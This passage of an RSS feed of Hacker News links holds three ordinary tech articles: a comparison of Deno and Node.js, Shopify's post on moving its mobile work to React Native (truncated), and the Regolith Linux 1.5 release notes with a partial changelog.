<![CDATA[Deno is the same as Node.js, but different]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25067625">thread link</a>) | @velmu
<br/>
November 12, 2020 | https://developers.ibexa.co/blog/deno-is-the-same-as-node.js-but-different | <a href="https://web.archive.org/web/*/https://developers.ibexa.co/blog/deno-is-the-same-as-node.js-but-different">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>JavaScript has been on a roll for more than a decade now. What started as a language used for sprinkling some interactivity to static HTML has grown to be arguably the world's most widespread general purpose programming language. The hegemony of JavaScript is also evident on the server side, with Node.js being a staple of job ads for many years. Recently there's been some buzz around a similar technology:&nbsp;<a href="https://deno.land/" title="">Deno</a></p><div><p>Let's find out what Deno is and how it compares with <a href="https://nodejs.org/" title="">Node.js</a>. First things first: The name Deno is an <a href="https://www.arrak.fi/en/ag" title="">anagram</a> of Node, and they are two&nbsp;different open source software projects.&nbsp;Deno&nbsp;sounds like a cheap knock-off of the more established Node.js, given the two technologies' problem domain and overall similarity. But once you learn both were originally kicked off by the same person, <a href="https://en.wikipedia.org/wiki/Ryan_Dahl" title="">Ryan Dahl</a>,&nbsp;it changes the perception.</p><p>Dahl released the first version of Node.js in May 2009. In January 2012 he stepped aside from the project to focus on other things. To the surprise of many he announced Deno in 2018 at a conference talk titled&nbsp;<a href="https://www.youtube.com/watch?v=M3BM9TB-8yA" title="">10 Things I Regret About Node.js</a>. in his talk, the primus motor of Node.js outlines some of the things he'd do differently today.&nbsp;That is what Deno is: An alternative&nbsp;take on a server-side JavaScript runtime.</p><p>Since the unveiling of&nbsp;Deno a developer community has grown&nbsp;around it. To many outside of the dev realm their efforts culminated in the <a href="https://deno.land/posts/v1" title="">launch of&nbsp;1.0</a> in May 2020.</p><h3>What do Node.js and Deno have in common?</h3><p>Both Deno and Node run on the same technology platform: The <a href="https://en.wikipedia.org/wiki/V8_(JavaScript_engine)" title="">V8 JavaScript engine</a>. This is a widespread JavaScript runtime that is largely developed by Google for their <a href="https://en.wikipedia.org/wiki/Google_Chrome" title="">Chrome</a> web browser, but is also present in&nbsp;<a href="https://www.chromium.org/" title="">Chromium</a> variants like <a href="https://opera.com/" title="">Opera</a> and <a href="https://www.microsoft.com/en-us/edge" title="">Microsoft Edge</a>. The&nbsp;<a href="https://v8.dev/" title="">V8 project</a> has&nbsp;received huge investments in time and resources from volunteers and companies. In short,&nbsp;V8 is a killer: It's blazing fast and gets new language features from&nbsp;<a href="https://www.ecma-international.org/publications/standards/Ecma-262.htm" title="">ECMAScript-262</a> (the standard that defines <a href="https://en.wikipedia.org/wiki/JavaScript" title="">JavaScript</a>).</p><p>Node and Deno both do more or less the same thing: They run JavaScript code on a server (yes, there is always a server, even if you're <a href="https://en.wikipedia.org/wiki/Serverless_computing" title="">serverless</a>). The range of apps that can be&nbsp;built&nbsp;is wide; a&nbsp;data pump proxying streams of data from one location and format to another is a common use case, as are API backends for <a href="https://en.wikipedia.org/wiki/Single-page_application" title="">SPAs</a>,&nbsp;but you can also write complex full-stack backend apps like the <a href="https://ghost.org/" title="">Ghost blogging platform</a> or custom apps with <a href="https://developers.ibexa.co/content-root/blog/getting-started-with-next.js-and-ez-platform">a framework like Next.js</a>&nbsp;that runs&nbsp;<a href="https://en.wikipedia.org/wiki/Isomorphic_JavaScript" title="">on the server and the client</a>.</p><p>The shared architecture of JavaScript/V8 means both share similar performance characteristics. There can be some differences, where one is better than the other - but as a baseline both are performant enough for most uses and can be scaled horizontally. If you're looking for the absolute best throughput you should probably <a href="https://www.ageofascent.com/2019/02/04/asp-net-core-saturating-10gbe-at-7-million-requests-per-second/" title="">look at something like .NET Core</a> or something very&nbsp;low level. There are areas where V8 performance won't cut it, but if you're in those fields then you probably know it.</p><p>The JavaScript ecosystem is massive. The core skills you need to work with either Node or Deno are very similar. The syntax is identical, even though Deno actually enforces the use of <a href="https://www.typescriptlang.org/" title="">TypeScript</a>&nbsp;in the <a href="https://en.wikipedia.org/wiki/User_space" title="">userland</a>. TypeScript is a superset of JavaScript, adding optional typing and other features that can be useful in development phase. It's also worth noting that you can also develop Node.js apps in TypeScript, and ultimately the V8 engine executes loosely JavaScript that is compiled from the TypeScript source.</p><h3>How is Deno different from Node.js?</h3><p>Unlike with Node, the use of TypeScript is a requirement with Deno. Some parts of Deno itself are written in TypeScript, but <a href="https://startfunction.com/deno-will-stop-using-typescript/" title="">the team is looking to change that</a> as it is not well suited for that purpose. TS is <a href="https://basarat.gitbook.io/typescript/type-system" title="">not strictly typed</a> and does not offer a bullet proof runtime enforcing 100% <a href="https://en.wikipedia.org/wiki/Type_safety" title="">type safety</a>, but relies quite a bit&nbsp;on <a href="https://en.wikipedia.org/wiki/Type_inference" title="">type inference</a>&nbsp;to <a href="https://symfony.fi/entry/a-practical-introduction-to-typescript-for-php-developers#make-javascript-great-again" title="">enable type checking and associated development time tooling in&nbsp;IDEs for JavaScript</a>.</p><p>Another significant difference is the security model. Node.js never had a universal security model baked in. This means that it easy to write code that will do a lot of harm in the wrong hands,&nbsp;maliciously&nbsp;or accidentally. The approach in Deno is different,&nbsp;in line with browsers and the <a href="https://developers.ibexa.co/content-root/blog/secure-by-default-why-the-role-based-permission-model-offers-powerful-security" title="">Ibexa DXP permissions&nbsp;model</a>:</p><blockquote><p>Deno is secure by default. Therefore, unless you specifically enable it, a deno module has no file, network, or environment access for example. Access to security-sensitive areas or functions requires the use of permissions to be granted to a deno process on the command line.<br>- <a href="https://deno.land/manual/getting_started/permissions" title="">Deno Manual: Permissions</a></p></blockquote><p>The <a href="https://en.wikipedia.org/wiki/Standard_library" title="">standard library</a> is another area where Deno is different from Node.js. Node has a fairly small standard library, which has lead into a large number of&nbsp;external packages for (what some think) should be offered by default in the distribution. For Deno this is again different, as they offer a more comprehensive standard library inspired by&nbsp;<a href="https://golang.org/" title="">Go</a>:</p><blockquote><p>deno_std is a loose port of&nbsp;<a href="https://golang.org/pkg/">Go's standard library</a>. When in doubt, simply port Go's source code, documentation, and tests. There are many times when the nature of JavaScript, TypeScript, or Deno itself justifies diverging from Go, but if possible we want to leverage the energy that went into building Go. We generally welcome direct ports of Go's code.<br>- <a href="https://deno.land/std" title="">Deno Standard Library</a></p></blockquote><p>Related to external packages, this is another big difference between the two. Node.js relies on a central repository, <a href="https://www.npmjs.com/" title="">NPM</a>, for storing and delivering libraries and other code. This ecosystem is a huge benefit for developers as it reduces&nbsp;<a href="https://en.wikipedia.org/wiki/Duplicate_code" title="">duplication</a>. With <a href="https://snyk.io/blog/npm-passes-the-1-millionth-package-milestone-what-can-we-learn/" title="">over a million packages on NPM</a>,&nbsp;it's a common phrase to say <em>there's an NPM package for that</em>&nbsp;in the developer circles. And often this is true, and the benefits are obvious.</p><p>Shared code is good code, and Deno does not intend to implement everything in the <em>stdlib</em>. What is fundamentally different is the distribution model. Instead of a central repository, <a href="https://deno.land/manual/linking_to_external_code" title="">any URL can contain a package</a>. The project hosts a set of packages over at&nbsp;<a href="https://deno.land/x">deno.land/x</a>, but it is not enforced anywhere. This means there is no central owner like with&nbsp;<a href="https://en.wikipedia.org/wiki/Npm_(software)" title="">NPM</a> (now <a href="https://github.blog/2020-03-16-npm-is-joining-github/" title="">owned by GitHub</a> <a href="https://news.microsoft.com/announcement/microsoft-acquires-github/" title="">owned by Microsoft</a>). This approach means you can host a <a href="https://en.wikipedia.org/wiki/Web_server" title="">HTTP server</a> (public or private) and reference libraries directly from there.</p><p>Another area related to extensions is the simplification of code packaging. When Node.js came around, there was no standard <a href="https://en.wikipedia.org/wiki/Modular_programming" title="">module format</a> in the ECMAScript spec. This is why Node.js rolled&nbsp;its&nbsp;own module format, known as&nbsp;<a href="https://en.wikipedia.org/wiki/CommonJS" title="">CommonJS</a>. Because of the popularity of Node.js, CommonJS became the <a href="https://en.wikipedia.org/wiki/De_facto_standard" title="">de facto standard</a>&nbsp;for modules in the JavaScript ecosystem. Since that time the ECMAScript has received regular updates and now includes a <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Modules" title="">standard JavaScript Modules</a>&nbsp;that also <a href="https://jakearchibald.com/2017/es-modules-in-browsers/" title="">work in browsers</a>.</p><p>Nowadays <a href="https://nodejs.medium.com/announcing-core-node-js-support-for-ecmascript-modules-c5d6dc29b663" title="">Node.js also&nbsp;supports JavaScript&nbsp;modules</a>, but much of the ecosystem continues to use CommonJS. Both formats do more or less the same thing, but with a different syntax. This can make it confusing to work with Node since you can use two different ways for a core functionality.&nbsp;<a href="https://deno.land/manual/examples/import_export" title="">Deno standardizes on ECMAScript modules</a>.</p>        
<div>
    
    
    <figure><img src="https://developers.ibexa.co/var/site/storage/images/_aliases/medium/0/0/3/2/112300-1-eng-GB/deno-mascot.png" alt="" height="188" width="200"></figure>

</div>
<p>Finally there's the mascot, Deno. Just take a look at the <a href="https://deno.land/artwork" title="">artwork from the collection</a> (blog post main image courtesy of&nbsp;<a href="https://www.dimitrijagal.com/" title="">Dimitrij Agal</a>).&nbsp;Who could say no to the lil' one?</p><h3>Conclusion</h3><p>As we've learnt there are a number of similarities between Deno and Node.js, but also some key differences in philosophy and implementation. Perhaps the <a href="https://github.com/denoland/deno/issues/47" title="">most controversial difference</a> is the novel take on dependency management in Deno. Resolving a complex set of dependencies could be more challenging (and potentially more unreliable)&nbsp;in this fully distributed model. It's worth noting that you can use packages from the&nbsp;NPM catalogue with <a href="https://jspm.org/" title="">jspm&nbsp;that hosts NPM packages as ES modules</a>.</p><p>Node.js has massive clout on the market, it is a hot technology and developers are sought after by both startups and enterprises. The vibrant ecosystem&nbsp;proves that there is nothing fundamentally wrong with Node.js and it&nbsp;is a big part of the JavaScript success story of the last decade. Node.js is not going anywhere, but&nbsp;Deno could carve out&nbsp;a niche for itself. One thing&nbsp;that comes to mind is&nbsp;FaaS (<a href="https://en.wikipedia.org/wiki/Function_as_a_service" title="">Function as a Service</a>), whose development could be simpler&nbsp;with Deno's more&nbsp;extensive&nbsp;standard library.</p><p>But wait a minute... This is the <a href="https://www.ibexa.co/" title="">Ibexa</a> blog. What's Deno got to do with you? Well, nothing as of now. We're using plenty of JavaScript, for example,&nbsp;<a href="https://www.reactjs.org/" title="">React.js components</a> for the administration user interface, and our asset build pipeline is Node.js based, courtesy of <a href="https://symfony.com/doc/current/frontend/encore/installation.html" title="">Symfony Encore</a>. But as of now the&nbsp;<a href="https://developers.ibexa.co/content-root/products" title="">Ibexa DXP line of products</a> aren't utilizing any active JavaScript server <a href="https://en.wikipedia.org/wiki/Daemon_(computing)" title="">daemons</a> in Node.js, Deno or <a href="https://cs.nyu.edu/~yap/html/tutorial/getstart.htm" title="">Netscape Livewire</a>.</p><p>Implementations where Ibexa DXP is deployed are a different case. Our technology is often a piece of a puzzle involving many technology components, from&nbsp;<a href="https://en.wikipedia.org/wiki/A/B_testing" title="">A/B testing</a> services to&nbsp;<a href="https://developers.ibexa.co/content-root/resources/ebooks/e-commerce-integration-with-erp-and-other-business-systems-pim-and-crm">integrations to enterprise backend systems like ERPs</a>. This is where server side JavaScript is widely used, most commonly as <a href="https://developers.ibexa.co/content-root/blog/running-a-node.js-application-on-ibexa-cloud">Node.js apps&nbsp;that also run on Ibexa Cloud</a>, but increasingly as cloud functions like <a href="https://docs.microsoft.com/en-us/azure/azure-functions/functions-overview" title="">Azure Functions</a> or <a href="https://aws.amazon.com/lambda/" title="">AWS Lambda</a>.</p><p>As a melting pot of data and services a Digital Experience Platform needs to be able to interface with everything. This is why it is good for <a href="https://developers.ibexa.co/content-root/success-stories">our clients</a>, <a href="https://developers.ibexa.co/content-root/partners">partners</a> and us to be aware of&nbsp;emerging technologies. Integrations are key for <a href="https://developers.ibexa.co/content-root/blog/the-mid-enterprise-market-guide-to-digital-experience-platforms">DXPs</a>&nbsp;and Deno could be a contender in that space in the near future. And even if it is not, you always learn by&nbsp;studying&nbsp;alternative solutions to problems. Even the ones you choose not to go for.</p>
</div></div>]]>
            </description>
            <link>https://developers.ibexa.co/blog/deno-is-the-same-as-node.js-but-different</link>
            <guid isPermaLink="false">hacker-news-small-sites-25067625</guid>
            <pubDate>Thu, 12 Nov 2020 08:11:05 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[React Native Is the Future of Mobile at Shopify]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25067617">thread link</a>) | @hijklmno
<br/>
November 12, 2020 | https://shopify.engineering/react-native-future-mobile-shopify | <a href="https://web.archive.org/web/*/https://shopify.engineering/react-native-future-mobile-shopify">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
  <p>After years of native mobile development, we’ve decided to go full steam ahead building all of our new mobile apps using React Native. As I’ll explain, that decision doesn’t come lightly.</p>
<p>Each quarter, the majority of buyers purchase on mobile (with 71% of our buyers purchasing on mobile in Q3 of last year). Black Friday and Cyber Monday (together, BFCM) are the busiest time of year for our merchants, and buying activity during those days is a bellwether. During this year’s BFCM, Shopify merchants saw another 3% increase in purchases on <a href="https://news.shopify.com/shopify-merchants-break-records-with-29-billion-in-worldwide-sales-over-black-fridaycyber-monday-weekend" target="_blank" title="Shopify merchants break records with $2.9+ billion in worldwide sales over Black Friday/Cyber Monday weekend" rel="noopener noreferrer">mobile, an average of 69% of sales</a>.</p>
<p>So why the switch to React Native? And why now? How does this fit in with our native mobile development? It’s a complicated answer that’s best served with a little background.</p>

<p>We have an engineering culture at Shopify of making specific early technology bets that help us move fast.</p>
<p>On the whole, we prefer to have few technologies as a foundation for engineering. This provides us multiple points of leverage:</p>
<ul>
<li>we build <em>extremely</em> specific expertise in a small set of deep technologies (we often become core contributors)</li>
<li>every technology choice has quirks, but we learn them intimately</li>
<li>those outside of the initial team contribute, transfer and maintain code written by others</li>
<li>new people are onboarded more quickly.</li>
</ul>
<p>At the same time, there are always new technologies emerging that provide us with an opportunity for a step change in productivity or capability. We experiment a lot for the opportunity to unlock improvements that are an order of magnitude improvement—but ultimately, we adopt few of these for our core engineering.</p>
<p>When we do adopt these early languages or frameworks, we make a calculated bet. And instead of shying away from the risk, we meticulously research, explore and evaluate such risks based on our unique set of conditions. As is often within risky areas, the unexplored opportunities are hidden. We instead think about how we can mitigate that risk:</p>
<ul>
<li>what if a technology stops being supported by the core team?</li>
<li>what if we run into a bug we can’t fix?</li>
<li>what if the product goes in a direction against our interests?</li>
</ul>
<p>Ruby on Rails was a nascent and obscure framework when Tobi (our CEO) first got involved as a <a href="https://github.com/tobi" target="_blank" title="Tobi on GitHub" rel="nofollow noopener noreferrer">core contributor</a> in 2004. For years, Ruby on Rails has been seen as a non-serious, <a href="https://m.signalvnoise.com/ruby-has-been-fast-enough-for-13-years/" target="_blank" title="Ruby has been fast enough for 13 years - Signal vs. Noise" rel="nofollow noopener noreferrer">non-performant</a> language choice. But that early bet gave Shopify the momentum to outperform the competition even though it was not a popular technology choice. By using Ruby on Rails, the team was able to build faster and attract a different set of talent by using something more modern and with a higher level of abstraction than traditional programming languages and frameworks. <a href="http://www.paulgraham.com/avg.html" target="_blank" title="Beating the Averages - PaulGraham.com" rel="nofollow noopener noreferrer">Paul Graham talks about his decision to use Lisp in building Viaweb to similar effect</a>&nbsp;and <a href="https://twitter.com/mhartl/status/1179561691857616896" target="_blank" title="Michael Hartl on Twitter" rel="nofollow noopener noreferrer">6 of the 10 most valuable Y Combinator companies today all use Ruby on Rails (even though again, it still remains largely unpopular)</a>. As a contrast, none of the Top 10 most valuable Y Combinator companies use Java; largely considered the battle tested enterprise language.</p>
<p>Similarly two years ago, Shopify decided to make the jump to <a href="https://engineering.shopify.com/blogs/engineering/shopify-infrastructure-collaboration-with-google" target="_blank" title="Shopify’s Infrastructure Collaboration with Google" rel="noopener noreferrer">Google Cloud</a>.&nbsp;<span>Again, a scary proposition for the 3rd largest US Retail eCommerce site in 2019—to do a cloud migration away from our own data centers, but to also pick an early cloud contender.&nbsp;</span>We saw the technology arc of value creation moving us to focusing on what we’re good at—enabling entrepreneurship and letting others (in this case Google Cloud) focus on the undifferentiated heavy lifting of maintaining physical hardware, power, security, the operating system updates, etc.</p>
<h2>What is React Native?</h2>
<p>In 2015, <a href="https://www.youtube.com/watch?v=KVZ-P-ZI6W4" target="_blank" title="React.js Conf 2015 Keynote - Introducing React Native" rel="nofollow noopener noreferrer">Facebook announced</a> and open sourced <a href="https://facebook.github.io/react-native/" target="_blank" title="React Native" rel="nofollow noopener noreferrer">React Native</a>; it was already being used internally for their mobile engineering. React Native is a framework for building native mobile apps using <a href="https://reactjs.org/" target="_blank" title="ReactJS" rel="nofollow noopener noreferrer">React</a>. This means you can use a best-in-class JavaScript library (React) to build your native mobile user interfaces.</p>
<p>At Shopify, the idea had its skeptics at the time (and still does), but many saw its promise. At the company’s next <a href="https://twitter.com/ShannonKarleen/status/1204881060213002240?s=20" target="_blank" title="Shannon Gallagher on Twitter" rel="nofollow noopener noreferrer">Hackdays</a>&nbsp;the entire company spent time on React Native. While the early team saw many benefits, they decided that we couldn’t ship an app we’d be proud of using React Native in 2015. For the most part, this had to do with performance and the absence of first-class Android support. What we did learn was that we liked the <a href="https://en.wikipedia.org/wiki/Reactive_programming" target="_blank" title="Reactive Programming - Wikipedia" rel="nofollow noopener noreferrer">Reactive programming</a> model and <a href="https://help.shopify.com/en/api/getting-started/shopify-and-graphql/graphql-benefits" title="GraphQL Benefits" target="_blank" rel="noopener noreferrer">GraphQL</a>. Also, we built and open-sourced a&nbsp;<a href="https://github.com/Shopify/FunctionalTableData" target="_blank" title="FunctionalTableData on GitHub" rel="nofollow noopener noreferrer">functional rendere</a>r for iOS after working with React Native. We adopted these technologies in 2015 for our native mobile stack, but not React Native for mobile development en masse. <a href="https://www.theglobeandmail.com/report-on-business/how-shopify-finally-got-smart-about-mobile/article33184093/" target="_blank" title="Shopify Grows Up" rel="nofollow noopener noreferrer">The Globe and Mail documented our aspirations</a> in a comprehensive story about the first version of our mobile apps.</p>
<p>Until now, the standard for all mobile development at Shopify was native mobile development. We built <a href="https://engineering.shopify.com/blogs/engineering/tagged/mobile-tooling" target="_blank" title="Mobile Tooling on Shopify Engineering" rel="noopener noreferrer">mobile tooling and foundations</a> teams focused on iOS and Android helping accelerate our development efforts. While these teams and the resulting applications were all successful, there was a suspicion that we could be more effective as a team if we could:</p>
<ul>
<li>bring the power of JavaScript and the web to mobile</li>
<li>adopt a reactive programming model across all client-side applications</li>
<li>consolidate our iOS and Android development onto a single stack.</li>
</ul>
<h3>How React Native Works</h3>
<p>React Native provides a way to build native cross platform mobile apps using JavaScript. React Native is similar to React in that it allows developers to create declarative user interfaces in JavaScript, for which it internally creates a hierarchy tree of UI elements or in React terminology a virtual DOM. Whereas the output of ReactJS targets a browser, React Native translates the virtual DOM into mobile native views using platform native bindings that interface with application logic in JavaScript. For our purposes, the target platforms are Android and iOS, but community driven effort have brought React Native to other platforms such as Windows, macOS and Apple tvOS.</p>
<p><img alt="ReactJS targets a browser, whereas React Native can can target mobile APIs." data-src="//cdn.shopify.com/s/files/1/0779/4361/files/React_Native_Blog_Post_2.jpg?v=1580316281" src="https://cdn.shopify.com/s/files/1/0779/4361/files/React_Native_Blog_Post_2.jpg?v=1580316281"></p>

<p><em>ReactJS targets a browser, whereas React Native can target mobile APIs.</em></p>
<h3>When Will We Not Default to Using React Native?</h3>
<p>There are situations where React Native would not be the default option for building a mobile app at Shopify. For example, if we have a requirement of:</p>
<ul>
<li>deploying on older hardware (CPU &lt;1.5GHz)</li>
<li>extensive processing</li>
<li>ultra-high performance</li>
<li>many background threads.</li>
</ul>
<p>Reminder: Low-level libraries including many open sourced SDKs will remain purely native. And we can always create our own native modules when we need to be close to the metal.</p>
<h3>Why Move to React Native Now?</h3>
<p>There were 3 main reasons now is a great time to take this stance:</p>
<ol>
<li>we learned from our acquisition of Tictail (a mobile first company that focused 100% on React Native) in 2018 how far React Native has come and made 3 deep product investments in 2019</li>
<li>Shopify uses React extensively on the web and that know-how is now transferable to mobile</li>
<li>we see the performance curve bending upwards (think what’s now possible in Google Docs vs. desktop Microsoft Office) and we can long-term invest in React Native like we do in Ruby, Rails, Kubernetes and Rich Media.</li>
</ol>

<p>We have many mobile surfaces at Shopify for buyers and merchants to interact, both over the web and with our mobile apps. We spent time over the last year experimenting with React Native with three separate teams over three apps: Arrive, Point of Sale, and Compass.</p>
<p>From our experiments we learned that:</p>
<ul>
<li>in rewriting the Arrive app in React Native, the team felt that they were twice as productive than using native development—even just on one mobile platform</li>
<li>testing our Point of Sale app on low-power configurations of Android hardware let us set a lower CPU threshold than previously imagined (1.5GHz vs. 2GHz)</li>
<li>we estimated ~80% code sharing between iOS and Android, and were surprised by the extremely high-levels in practice—95% (Arrive) and 99% (Compass)</li>
</ul>
<p>As an aside, even though we’re making the decision to build all new apps using React Native, that doesn’t mean we’ll automatically start rewriting our old apps in React Native.</p>
<h2>Arrive</h2>
<p>At the end of 2018, we decided to rewrite one of our most popular consumer apps, <a href="https://tryarrive.com/" target="_blank" title="Arrive by Shopify" rel="nofollow noopener noreferrer">Arrive</a> in React Native. Arrive is no slouch, it’s a highly rated, high performing app that has millions of downloads on iOS. It was a good candidate because we didn’t have an Android version. Our efforts would help us reach all of the Android users who were clamoring for Arrive. It’s now React Native on both iOS and Android and shares 95% of the same code. We’ll do a deep dive into Arrive in a future blog post.</p>
<p>So far this rewrite resulted in:</p>
<ul>
<li>less crashes on iOS than our native iOS app</li>
<li>an Android version launched</li>
<li>team composed of mobile + non-mobile developers.</li>
</ul>
<p>The team also came up with this cool way to instantly test work-in-progress pull requests. You simply scan a QR code from an automated GitHub comment on your phone and the JavaScript bundle is updated in your app and you’re now running the latest code from that pull request. JML, <a href="https://twitter.com/jmwind/status/1185268708383645698?s=20" target="_blank" title="JML on Twitter" rel="nofollow noopener noreferrer">our CTO, shared the process on Twitter recently</a>.</p>
<h2>Point of Sale</h2>
<p>At the beginning of 2019, we did a 6-week experiment on our flagship <a href="https://www.shopify.ca/pos" target="_blank" title="Shopify POS" rel="noopener noreferrer">Point of Sale (POS) app</a> to see if it would be a good candidate for a rewrite in React Native. We learned a lot, including that our retail merchants expect almost 2x the responsiveness in our POS due to the muscle memory of using our app while also talking to customers.</p>
<p>In order to best serve our retail merchants and learn about React Native in a physical retail setting, we decided to build out the new POS natively for iOS and use React Native for Android.</p>
<p>We went ahead with 2 teams for the following reasons:</p>
<ol>
<li>we already had a team ramped up with iOS expertise, including many of the folks that built the original POS apps</li>
<li>we wanted to be able to benchmark our React Native engineering velocity as well as app performance against the gold standard which is native iOS</li>
<li>to meet the high performance requirements of our merchants, we felt that we’d need all of the <a href="https://github.com/react-native-community/discussions-and-proposals/issues/4" target="_blank" title="React Native Fabric (UI-Layer Re-architecture) on GitHub" rel="nofollow noopener noreferrer">Facebook …</a></li></ol></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://shopify.engineering/react-native-future-mobile-shopify">https://shopify.engineering/react-native-future-mobile-shopify</a></em></p>]]>
            </description>
            <link>https://shopify.engineering/react-native-future-mobile-shopify</link>
            <guid isPermaLink="false">hacker-news-small-sites-25067617</guid>
            <pubDate>Thu, 12 Nov 2020 08:09:48 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Release Notes for Regolith 1.5]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25067509">thread link</a>) | @pedrokost
<br/>
November 11, 2020 | https://regolith-linux.org/docs/reference/releases/regolith-1.5-release-notes/ | <a href="https://web.archive.org/web/*/https://regolith-linux.org/docs/reference/releases/regolith-1.5-release-notes/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
	
	<p>Release notes for Regolith 1.5.</p>
	<p>Regolith R1.5 is a feature release which includes several improvements and optimizations.  To summarize, Regolith 1.5 ships simpler workspace management, a Rofi-based Look switcher, and numerous internal optimizations and cleanup.  Read below for more details.</p>
<h2 id="known-issues">Known Issues</h2>
<p>Issues and fixes are being tracked in <a href="https://github.com/orgs/regolith-linux/projects/13">this project</a>.</p>
<h2 id="features">Features</h2>
<table>
    <tbody>
        <tr>
            <td>Next Free Workspace</td>
            <td colspan="2">A typical part of managing workspaces in an i3-based desktop is moving to unused workspaces and then loading some applications. Before this feature, a user has to determine which unused workspace they prefer.  This is done by scanning the list of existing used workspaces to determine an unused one. Now, the system can do this automatically.  The <span><span>super</span> <span>`</span></span> keybinding will move to the next free workspace.  <span><span>super</span> <span>alt</span> <span>`</span></span> will move the focused window into the next free workspace.</td>
        </tr>
        <tr>
            <td>View and Change Looks via Rofi</td>
            <td><a href="https://regolith-linux.org/docs/reference/releases/regolith-select-look.png"><img width="640px" src="https://regolith-linux.org/docs/reference/releases/regolith-select-look.png"></a></td>
            <td>Looks can be changed now via a Rofi dialog rather than having to configure the Xresource override via the command-line.  To do this, use keybinding `<super>-<alt>l` and then select from the dialog to load a Look.</alt></super></td>
        </tr>
        <tr>
            <td>GSettings Overrides</td>            
            <td colspan="2">Regolith now uses [gsettings overrides](https://help.gnome.org/admin/system-admin-guide/stable/overrides.html.en) to configure various GNOME settings for use with Regolith.  In previous versions of Regolith, settings were written globally to the user session from within the Regolith startup code.  This could cause issues if the user works in multiple desktop environments.  Now, Regolith GNOME settings are defined in an override file that is only in effect while using a Regolith session.  This allows switching between desktop environments without settings from Regolith impacting other environments.</td>
        </tr>
        <tr>
            <td>New Looks</td>
            <td>
              <a href="https://regolith-linux.org/docs/reference/releases/regolith-dracula.png"><img width="640px" src="https://regolith-linux.org/docs/reference/releases/regolith-dracula.png">
              </a><a href="https://regolith-linux.org/docs/reference/releases/regolith-gruvbox.png"><img width="640px" src="https://regolith-linux.org/docs/reference/releases/regolith-gruvbox.png">
              </a><a href="https://regolith-linux.org/docs/reference/releases/regolith-pop-os.png"><img width="640px" src="https://regolith-linux.org/docs/reference/releases/regolith-pop-os.png">
            </a></td>
            <td>Users have contributed some new Looks to Regolith: dracula, gruvbox, and pop-os.  Each of these looks presents a distinctive color palate, typeface, and GTK theme.</td>
        </tr>
        <tr>
            <td>i3-gaps upgraded to 4.18.2</td>
            <td colspan="2">See i3-gaps <a href="https://github.com/Airblader/i3/blob/a4a1a44275ea402b25d2d1365e1163e496024358/RELEASE-NOTES-4.18.2">release notes here</a>.</td>
        </tr>
        <tr>
            <td>More Refined Customizations</td>
            <td colspan="2">Numerous small changes allow more granular system customization, such as specifying the temperature unit, custom Compositor settings, and a more comprehensive way of changing i3 keybindings without having to copy the entire config file.</td>
        </tr>
        <tr>
            <td>More Desktop Environment Packages</td>
            <td colspan="2">The following packages can be installed in place of <code>regolith-desktop</code> for specific sets of packages based on user needs: <code>regolith-desktop-minimal</code>, <code>regolith-desktop-standard</code>, <code>regolith-desktop-mobile</code>, and <code>regolith-desktop-complete</code></td>
        </tr>
        <tr>
            <td>New default compositor: Picom version 8</td>
            <td colspan="2">See Picom's <a href="https://github.com/yshui/picom/releases">releaes notes here</a>.</td>
        </tr>
        <tr>
            <td>Remontoire upgraded to version 1.4</td>
            <td colspan="2">Includes better multi-monitor support and other bug fixes and enhancements.</td>
        </tr>
        <tr>
            <td>Optional integration with <b>td-cli</b></td>
            <td><a href="https://regolith-linux.org/docs/reference/releases/regolith-td.png"><img width="640px" src="https://regolith-linux.org/docs/reference/releases/regolith-td.png"></a></td>
            <td>Access a simple todo app via Rofi.</td>
        </tr>
        <tr>
            <td>Documentation of development process.</td>
            <td colspan="2">The <a href="https://regolith-linux.org/docs/policy-and-process/development/">Regolith development process</a> is now better documented to enable greater transparency and inclusion.</td>
            <td></td>
        </tr>
      
    </tbody>
</table>
<h2 id="fixes">Fixes</h2>
<p>Have a look at the R1.5 project page for a <a href="https://github.com/orgs/regolith-linux/projects/12">list of bug fixes</a>.</p>
<h2 id="changelog-delta-from-regolith-141-to-regolith-15">Changelog Delta from Regolith 1.4.1 to Regolith 1.5</h2>
<pre><code>########################################
# Release Notes for dracula-gtk
########################################
dracula-gtk (1.0.1-1) bionic; urgency=medium

  [ Ken Gilmer ]
  * Remove unnecessary files


dracula-gtk (1.0-1) bionic; urgency=medium

  * [ Ken Gilmer ]
  * Packaging version add4f8c 

########################################
# Release Notes for fonts-materialdesignicons-webfont
########################################
fonts-materialdesignicons-webfont (1.6.50-3regolith3) bionic; urgency=medium

  * Backporting to bionic for Regolith. 


########################################
# Release Notes for gruvbox-gtk
########################################
gruvbox-gtk (1.0.1-1) bionic; urgency=medium

  [ Ken Gilmer ]
  * Rename root directory of theme to Gruvbox for consistency w/ other GTK themes.
  * Add gbp config for package management.


gruvbox-gtk (1.0-1) bionic; urgency=medium

  [ Ken Gilmer ]
  * New upstream version 1.0


gruvbox-gtk (1.0-1) bionic; urgency=medium

  [ eximus ]
  * Initial commit
  * gruvbox theme


########################################
# Release Notes for i3-gaps-wm
########################################
i3-gaps-wm (4.18.2-1~regolith2) bionic; urgency=medium

  * Package source from upstream https://github.com/Airblader/i3/releases/tag/4.18.2


########################################
# Release Notes for i3ipc-python
########################################
i3ipc-python (2.1.1-1ubuntu1~ppa6) bionic; urgency=medium

  * Update build dependencies hoping to resolve packaing problems. 



########################################
# Release Notes for i3xrocks
########################################
i3xrocks (1.3.4-1) bionic; urgency=medium

  [ Ken Gilmer ]
  * Version bump to match changelog.  Cleanup.


i3xrocks (1.3.3-1) bionic; urgency=medium

  [ Will Winder ]
  * Add optional default resource value.
  * Minor cleanup.
  * Free resource allocated by xcb_xrm_resource_get_string
  * Fix possible truncated resource value.

  [ Ken Gilmer ]
  * Add gbp config file


########################################
# Release Notes for picom
########################################
